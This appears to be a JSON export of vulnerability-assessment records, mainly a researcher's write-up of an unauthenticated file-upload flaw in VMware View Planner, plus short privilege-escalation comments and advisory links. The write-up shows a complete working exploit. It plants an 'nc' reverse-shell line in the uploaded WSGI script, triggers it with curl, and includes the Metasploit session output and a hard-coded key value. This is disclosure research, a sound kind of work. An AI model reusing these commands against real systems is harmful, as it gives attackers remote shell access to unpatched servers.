          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fc456e03-adf5-409a-955a-8a4fb7e79ece",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "eb5b0c32-6562-4ae0-88c2-b251a8414685",
      "created": "2021-03-04T03:30:38.475395Z",
      "revisionDate": "2021-03-10T05:15:42.670727Z",
      "document": "Quick patch diff below. Note the added auth and path traversal protection.\r\n\r\n```diff\r\n--- log_upload_wsgi.unpatched.py\t2021-03-03 20:18:16.000000000 -0600\r\n+++ log_upload_wsgi.patched.py\t2021-03-03 20:18:24.000000000 -0600\r\n@@ -1,104 +1,129 @@\r\n #! /usr/bin/env python3\r\n import cgi\r\n import os,sys\r\n import logging\r\n import json\r\n+import configparser\r\n+import hashlib\r\n\r\n WORKLOAD_LOG_ZIP_ARCHIVE_FILE_NAME = \"workload_log_{}.zip\"\r\n\r\n class LogFileJson:\r\n     \"\"\" Defines format to upload log file in harness\r\n\r\n     Arguments:\r\n     itrLogPath : log path provided by harness to store log data\r\n     logFileType : Type of log file defined in api.agentlogFileType\r\n     workloadID [OPTIONAL] : workload id, if log file is workload specific\r\n\r\n     \"\"\"\r\n     def __init__(self, itrLogPath, logFileType, workloadID = None):\r\n         self.itrLogPath = itrLogPath\r\n         self.logFileType = logFileType\r\n         self.workloadID = workloadID\r\n\r\n     def to_json(self):\r\n         return json.dumps(self.__dict__)\r\n\r\n     @classmethod\r\n     def from_json(cls, json_str):\r\n         json_dict = json.loads(json_str)\r\n         return cls(**json_dict)\r\n\r\n class agentlogFileType():\r\n     \"\"\" Defines various log file types to be uploaded by agent\r\n\r\n     \"\"\"\r\n     WORKLOAD_ZIP_LOG = \"workloadLogsZipFile\"\r\n\r\n try:\r\n     # TO DO: Puth path in some config\r\n     logging.basicConfig(filename=\"/etc/httpd/html/logs/uploader.log\",filemode='a', level=logging.ERROR)\r\n except:\r\n     # In case write permission is not available in log folder.\r\n     pass\r\n\r\n logger = logging.getLogger('log_upload_wsgi.py')\r\n\r\n def application(environ, start_response):\r\n     logger.debug(\"application called\")\r\n\r\n+    # TO DO: Puth path in some config or read from config is already available\r\n+    resultBasePath = \"/etc/httpd/html/vpresults\"\r\n+    config_path = \"/etc/httpd/conf/wsgi_config/wsgi.config\"\r\n+    # Reading configuration\r\n+    try:\r\n+        config = configparser.ConfigParser()\r\n+        config.read(config_path)\r\n+        secret_key = config[\"apache\"][\"key\"].strip()\r\n+    except Exception as e:\r\n+        body = u\"Exception {}\".format(str(e))\r\n+        start_response(\r\n+            '400 fail',\r\n+            [\r\n+                ('Content-type', 'text/html; charset=utf8'),\r\n+                ('Content-Length', str(len(body))),\r\n+            ]\r\n+        )\r\n+        return [body.encode('utf8')]\r\n+\r\n     if environ['REQUEST_METHOD'] == 'POST':\r\n         post = cgi.FieldStorage(\r\n             fp=environ['wsgi.input'],\r\n             environ=environ,\r\n             keep_blank_values=True\r\n         )\r\n-        # TO DO: Puth path in some config or read from config is already available\r\n-        resultBasePath = \"/etc/httpd/html/vpresults\"\r\n         try:\r\n             filedata = post[\"logfile\"]\r\n             metaData = post[\"logMetaData\"]\r\n-\r\n-            if metaData.value:\r\n-                logFileJson = LogFileJson.from_json(metaData.value)\r\n-\r\n-            if not os.path.exists(os.path.join(resultBasePath, logFileJson.itrLogPath)):\r\n-                os.makedirs(os.path.join(resultBasePath, logFileJson.itrLogPath))\r\n-\r\n-            if filedata.file:\r\n-                if (logFileJson.logFileType == agentlogFileType.WORKLOAD_ZIP_LOG):\r\n-                    filePath = os.path.join(resultBasePath, logFileJson.itrLogPath, WORKLOAD_LOG_ZIP_ARCHIVE_FILE_NAME.format(str(logFileJson.workloadID)))\r\n-                else:\r\n-                    filePath = os.path.join(resultBasePath, logFileJson.itrLogPath, logFileJson.logFileType)\r\n-                with open(filePath, 'wb') as output_file:\r\n-                    while True:\r\n-                        data = filedata.file.read(1024)\r\n-                        # End of file\r\n-                        if not data:\r\n-                            break\r\n-                        output_file.write(data)\r\n-\r\n-                body = u\" File uploaded successfully.\"\r\n-                start_response(\r\n-                    '200 OK',\r\n-                    [\r\n-                        ('Content-type', 'text/html; charset=utf8'),\r\n-                        ('Content-Length', str(len(body))),\r\n-                    ]\r\n-                )\r\n-                return [body.encode('utf8')]\r\n+            password = post[\"password\"]\r\n+            if hashlib.sha256(password.value.encode(\"utf8\")).hexdigest()==secret_key:\r\n+                if metaData.value:\r\n+                    logFileJson = LogFileJson.from_json(metaData.value)\r\n+\r\n+                dir_path = os.path.normpath(os.path.join(resultBasePath, logFileJson.itrLogPath))\r\n+                if not os.path.exists(dir_path) and dir_path.startswith(resultBasePath):\r\n+                    os.makedirs(dir_path)\r\n+\r\n+                if filedata.file:\r\n+                    if (logFileJson.logFileType == agentlogFileType.WORKLOAD_ZIP_LOG):\r\n+                        filePath = os.path.join(dir_path, WORKLOAD_LOG_ZIP_ARCHIVE_FILE_NAME.format(str(logFileJson.workloadID)))\r\n+                    else:\r\n+                        filePath = os.path.join(dir_path, logFileJson.logFileType)\r\n+\r\n+                    filePath = os.path.normpath(filePath)\r\n+                    if filePath.startswith(resultBasePath):\r\n+                        with open(filePath, 'wb') as output_file:\r\n+                            while True:\r\n+                                data = filedata.file.read(1024)\r\n+                                # End of file\r\n+                                if not data:\r\n+                                    break\r\n+                                output_file.write(data)\r\n+\r\n+                        body = u\" File uploaded successfully.\"\r\n+                        start_response(\r\n+                            '200 OK',\r\n+                            [\r\n+                                ('Content-type', 'text/html; charset=utf8'),\r\n+                                ('Content-Length', str(len(body))),\r\n+                            ]\r\n+                        )\r\n+                        return [body.encode('utf8')]\r\n\r\n         except Exception as e:\r\n             logger.error(\"Exception {}\".format(str(e)))\r\n             body = u\"Exception {}\".format(str(e))\r\n     else:\r\n         logger.error(\"Invalid request\")\r\n         body = u\"Invalid request\"\r\n\r\n+    body = u\"Invalid request\"\r\n     start_response(\r\n         '400 fail',\r\n         [\r\n             ('Content-type', 'text/html; charset=utf8'),\r\n             ('Content-Length', str(len(body))),\r\n         ]\r\n     )\r\n     return [body.encode('utf8')]\r\n```\r\n\r\nI have reproduced RCE with a personal PoC. I'm not sure about the \"secret key\" they added, but I think it's changed as part of the update.\r\n\r\n```\r\nwvu@kharak:~/Downloads/vp_4.6_sp1/harness$ cat wsgi.config\r\n[apache]\r\nkey = vmware-viewplanner-ca$hc0w\r\nwvu@kharak:~/Downloads/vp_4.6_sp1/harness$\r\n```\r\n\r\nWe'll see once I find time to test the patched version. I can confirm that RCE is within a Docker container. I haven't looked for LPE yet.\r\n\r\n**ETA: Someone else [released their PoC](https://twitter.com/osama_hroot/status/1367258907601698816), so here is mine in full:**\r\n\r\n```\r\nwvu@kharak:~/Downloads$ curl -kO https://192.168.123.183/wsgi_log_upload/log_upload_wsgi.py\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n100  3596  100  3596    0     0   121k      0 --:--:-- --:--:-- --:--:--  121k\r\nwvu@kharak:~/Downloads$ cp log_upload_wsgi.py log_upload_wsgi.py.bak\r\nwvu@kharak:~/Downloads$ vi log_upload_wsgi.py\r\nwvu@kharak:~/Downloads$ diff -u log_upload_wsgi.py.bak log_upload_wsgi.py\r\n--- log_upload_wsgi.py.bak\t2021-03-04 17:41:15.000000000 -0600\r\n+++ log_upload_wsgi.py\t2021-03-04 17:41:35.000000000 -0600\r\n@@ -90,6 +90,8 @@\r\n         except Exception as e:\r\n             logger.error(\"Exception {}\".format(str(e)))\r\n             body = u\"Exception {}\".format(str(e))\r\n+    elif environ[\"REQUEST_METHOD\"] == \"HACK\":\r\n+        os.system(\"mkfifo /tmp/hmwfq; nc 192.168.123.1 4444 0</tmp/hmwfq | /bin/sh >/tmp/hmwfq 2>&1; rm /tmp/hmwfq\")\r\n     else:\r\n         logger.error(\"Invalid request\")\r\n         body = u\"Invalid request\"\r\nwvu@kharak:~/Downloads$ curl -k https://192.168.123.183/logupload -F logfile=@log_upload_wsgi.py -F 'logMetaData={\"itrLogPath\":\"/etc/httpd/html/wsgi_log_upload\",\"logFileType\":\"log_upload_wsgi.py\"}'\r\n File uploaded successfully.wvu@kharak:~/Downloads$ curl -kX HACK https://192.168.123.183/logupload\r\n^C\r\nwvu@kharak:~/Downloads$ curl -k https://192.168.123.183/logupload -F \"logfile=@log_upload_wsgi.py.bak; filename=log_upload_wsgi.py\" -F 'logMetaData={\"itrLogPath\":\"/etc/httpd/html/wsgi_log_upload\",\"logFileType\":\"log_upload_wsgi.py\"}'\r\n File uploaded successfully.wvu@kharak:~/Downloads$\r\n```\r\n\r\n```\r\nmsf6 exploit(multi/handler) > run\r\n\r\n[+] mkfifo /tmp/hmwfq; nc 192.168.123.1 4444 0</tmp/hmwfq | /bin/sh >/tmp/hmwfq 2>&1; rm /tmp/hmwfq\r\n[*] Started reverse TCP handler on 192.168.123.1:4444\r\n[*] Command shell session 1 opened (192.168.123.1:4444 -> 192.168.123.183:57562) at 2021-03-04 17:41:59 -0600\r\n\r\nid\r\nuid=25(apache) gid=25(apache) groups=25(apache),\r\nuname -a\r\nLinux 8cfebb27995a 4.9.137-1.ph2 #1-photon SMP Tue Nov 20 14:26:55 UTC 2018 x86_64\r\n```\r\n\r\nETA: Here's the decompiled update script:\r\n\r\n```\r\nimport sys, os, configparser, shutil, time\r\ncwd = os.path.dirname(os.path.realpath(__file__))\r\nsys.path.append(cwd)\r\nimport change_password\r\nprint('Starting Update')\r\nwsgi_path_old = '/root/viewplanner/httpd/wsgi_log_upload/'\r\nwsgi_path_new = '/root/viewplanner/log_upload_app'\r\nwsgi_file = 'log_upload_wsgi.py'\r\nconfig_path = '/root/viewplanner/apache_config/wsgi_config'\r\nversion_file = '/root/viewplanner/version.txt'\r\nhttpd_conf_path = '/root/viewplanner/apache_config/httpd.conf'\r\ntry:\r\n    print('Updating config')\r\n    if not os.path.exists(config_path):\r\n        os.makedirs(config_path)\r\n    os.system('cp ' + os.path.join(cwd, 'wsgi.config') + ' ' + config_path)\r\nexcept Exception as e:\r\n    print('Updating config Failed!! {}'.format(e))\r\n    sys.exit(1)\r\n\r\ntry:\r\n    print('Updating wsgi')\r\n    if not os.path.exists(wsgi_path_new):\r\n        os.makedirs(wsgi_path_new)\r\n    shutil.copy(os.path.join(cwd, wsgi_file), wsgi_path_new)\r\n    httpd_conf = ''\r\n    with open(httpd_conf_path, 'r') as (fp):\r\n        httpd_conf = fp.read()\r\n    os.system('chmod -R o+x ' + wsgi_path_new)\r\n    httpd_conf = httpd_conf.replace('WSGIScriptAlias /logupload /etc/httpd/html/wsgi_log_upload/log_upload_wsgi.py', '<Directory /root/app>\\n    Require all granted\\n</Directory>\\nWSGIScriptAlias /logupload /root/app/log_upload_wsgi.py')\r\n    with open(httpd_conf_path, 'w') as (fp):\r\n        fp.write(httpd_conf)\r\n    os.system('docker rm -f appacheServer')\r\n    if os.path.exists(wsgi_path_old):\r\n        shutil.rmtree(wsgi_path_old)\r\n    os.system('docker run --restart on-failure --name appacheServer -p 80:80 -p 443:443 -v /root/viewplanner/apache_config:/etc/httpd/conf -v ' + wsgi_path_new + ':/root/app -v /root/viewplanner/httpd:/etc/httpd/html -d httpd_python_wsgi:1.0')\r\n    time.sleep(10)\r\n    os.system('docker exec -it appacheServer chmod a+x /root')\r\n    os.system('docker restart appacheServer')\r\n    os.system('docker exec -it appacheServer chmod -R 777 /etc/httpd/html')\r\n    os.system('docker exec -it appacheServer chmod -R 777 /etc/httpd/conf/wsgi_config/wsgi.config')\r\n    os.system('chmod -R o+x ' + config_path)\r\n    os.system('chmod 644 ' + os.path.join(config_path, 'wsgi.config'))\r\nexcept Exception as e:\r\n    print('Updating wsgi location failed!! {}'.format(e))\r\n    sys.exit(1)\r\n\r\nchange_password.set_password()\r\ntry:\r\n    print('Updating version')\r\n    current_version = ''\r\n    with open(version_file, 'r') as (fp):\r\n        current_version = fp.read()\r\n    if '-sp1' not in current_version:\r\n        current_version = current_version + '-sp1'\r\n        with open(version_file, 'w') as (fp):\r\n            fp.write(current_version)\r\nexcept Exception as e:\r\n    print('Updating version failed!! {}'.format(e))\r\n    sys.exit(1)\r\n\r\nprint('Update Completed')\r\n```\r\n\r\nAnd the password script...\r\n\r\n```\r\nimport sys, hashlib, configparser, getpass, hashlib\r\nconfig_file = '/root/viewplanner/apache_config/wsgi_config/wsgi.config'\r\ntry:\r\n    config = configparser.ConfigParser()\r\n    config.read(config_file)\r\nexcept Exception as e:\r\n    body = 'Exception {}'.format(str(e))\r\n    sys.exit(1)\r\n\r\ndef verify_current():\r\n    password = getpass.getpass(prompt='Enter current Password: ')\r\n    if hashlib.sha256(password.encode('utf8')).hexdigest() != config['apache']['key']:\r\n        return False\r\n    else:\r\n        return True\r\n\r\n\r\ndef set_password():\r\n    password = getpass.getpass(prompt='Enter new Password: ')\r\n    re_password = getpass.getpass(prompt='Re-enter new Password: ')\r\n    if password != re_password:\r\n        print('Password mismatch!!!')\r\n        sys.exit(1)\r\n    try:\r\n        hashed_password = hashlib.sha256(password.encode('utf8')).hexdigest()\r\n    except Exception as e:\r\n        print('Password Update failed!!! {}'.format(e))\r\n        sys.exit(1)\r\n\r\n    try:\r\n        config['apache']['key'] = hashed_password\r\n        with open(config_file, 'w') as (fp):\r\n            config.write(fp)\r\n    except Exception as e:\r\n        config.add_section('apache')\r\n        config.set('apache', 'key', hashed_password)\r\n        with open(config_file, 'w') as (fp):\r\n            config.write(fp)\r\n\r\n    print('Password changed successfully')\r\n\r\n\r\nif __name__ == '__main__':\r\n    if not verify_current():\r\n        print('Failed to verify password!!!')\r\n    else:\r\n        set_password()\r\n```\r\n\r\nStill haven't found time to test the patch, but it's in @gwillcox-r7's good hands now!",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f74912a8-11ca-4a0a-a0b2-4901d57cdc42",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "43daea3b-743a-46f9-9b82-616c8e45c8ef",
      "created": "2021-03-05T00:22:21.425749Z",
      "revisionDate": "2021-03-05T01:15:37.823136Z",
      "document": "Unlikely to be setUID, unlikely that you will have write control over the vulnerable part of the RPATH at the point another user runs it. More theoretical than actual.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "2cad01fd-8240-4731-9fee-108b964d7f11",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "d2a597a3-7440-4a06-a6a8-a03d0d606e4d",
      "created": "2021-03-05T00:23:58.578474Z",
      "revisionDate": "2021-03-05T01:15:33.909501Z",
      "document": "Unlikely to be setUID, unlikely that you will have write control over the vulnerable part of the RPATH at the point another user runs it. More theoretical than actual.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "0a788c75-f664-49cf-8351-6250b01fd6c3",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "f2d4025c-f05c-4176-8cd8-e725997b20b8",
      "created": "2021-03-05T00:25:33.587218Z",
      "revisionDate": "2021-03-08T18:28:03.928236Z",
      "document": "Unlikely to be setUID, unlikely that you will have write control over the vulnerable part of the RPATH at the point another user runs it. More theoretical than actual.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "aebe62dc-56ad-4a57-851d-12144e3fa0be",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "ca3f16e5-5b43-471e-a678-f1231559a5f1",
      "created": "2021-03-05T00:26:47.587451Z",
      "revisionDate": "2021-03-05T01:15:22.937668Z",
      "document": "Unlikely to be setUID, unlikely that you will have write control over the vulnerable part of the RPATH at the point another user runs it. More theoretical than actual.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "6d8e0776-1f1b-4e82-abea-63053cc2d9d9",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "a3f27040-17bf-44ff-ac3e-186234532aa9",
      "created": "2021-03-05T00:31:13.728936Z",
      "revisionDate": "2021-03-05T01:15:16.805502Z",
      "document": "https://talosintelligence.com/vulnerability_reports/TALOS-2018-0624\r\n\r\nThis bug is trivial to exploit but time consuming to gain useful advantage. Each execution of rmsock leaks 64 bits of kernel memory. Some work on grooming the kernel address space could make this more effective but I didn't pursue it.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "04f9a113-5574-4d9f-b18b-e900451dfa9c",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "306a6588-45c3-4253-820e-a67fcff15337",
      "created": "2021-03-05T00:36:20.695173Z",
      "revisionDate": "2021-03-05T01:15:13.887659Z",
      "document": "https://www.portcullis.co.uk/security-research-and-downloads/security-advisories/cve-2014-3074/",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "ba82f19d-ca1e-4b91-81a1-9673dd0eb1eb",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "6b9883d6-34ac-4f7f-bc15-426499dbc533",
      "created": "2021-03-05T00:41:40.822753Z",
      "revisionDate": "2021-03-05T01:15:11.169133Z",
      "document": "https://www.portcullis.co.uk/security-research-and-downloads/security-advisories/cve-2014-3977/",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "a16c3011-486b-4c17-a5bc-9873fb506006",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "9493e711-0068-4bd8-92e0-f1de2bd1296f",
      "created": "2021-03-05T00:44:57.619502Z",
      "revisionDate": "2021-03-05T01:15:07.617842Z",
      "document": "https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6be1b3e1-919e-4b4a-aaf1-8b96d8bdb8fb",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "31e2400f-2fc3-401e-ab66-d308cdc252f4",
      "created": "2021-03-05T00:47:02.738059Z",
      "revisionDate": "2021-03-05T01:15:04.562559Z",
      "document": "https://www.portcullis.co.uk/security-research-and-downloads/security-advisories/cve-2014-0930/",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "036b293f-b1e6-4bee-88c7-b3df928ebbfa",
      "editorId": "7ab7fece-b9d5-4a9c-9604-c9b9a17cd025",
      "topicId": "0082d0ed-65e5-4f5a-bfd0-886c45bae23d",
      "created": "2021-03-05T00:48:27.459254Z",
      "revisionDate": "2021-03-15T16:15:07.848244Z",
      "document": "https://www.portcullis.co.uk/security-research-and-downloads/security-advisories/cve-2014-2591/",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "329f3637-d069-4903-afaa-a39cad669ed8",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "dfa61fbf-688b-44e9-8b09-134e93207ad9",
      "created": "2021-03-08T17:47:06.778119Z",
      "revisionDate": "2021-03-08T17:47:06.788398Z",
